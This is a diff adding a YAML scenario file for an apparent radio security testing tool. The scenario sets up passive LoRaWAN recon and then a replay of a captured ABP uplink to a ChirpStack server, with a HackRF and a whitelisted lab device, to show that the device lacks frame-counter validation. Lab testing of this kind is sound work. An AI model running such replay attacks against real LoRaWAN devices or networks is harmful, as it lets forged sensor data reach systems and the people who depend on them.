@@ -1,0 +1,29 @@
+# LoRaWAN ABP replay demo scenario
+# Chains: passive recon → ABP uplink replay → verify on ChirpStack
+#
+# Usage:
+#   srt scenario scenarios/lora_abp_replay_demo.yaml
+#
+# Requires:
+#   - HackRF One
+#   - gr-lora_sdr installed
+#   - ChirpStack running (docker compose up)
+#   - Target DevAddr in safety/whitelist.yaml
+
+name: lora_abp_replay_demo
+description: >
+  Capture LoRaWAN ABP traffic, then replay an uplink to ChirpStack proving
+  the device has no FCnt validation.
+
+steps:
+  - module: lora.recon
+    params:
+      duration_s: 120
+      band: eu868
+
+  - module: lora.uplink_replay_abp
+    params:
+      devaddr: "26011BDA"            # ← replace with lab device
+      freq_hz: 868100000
+      sf: 7
+      capture_file: "data/captures/lora_abp_capture.cfile"
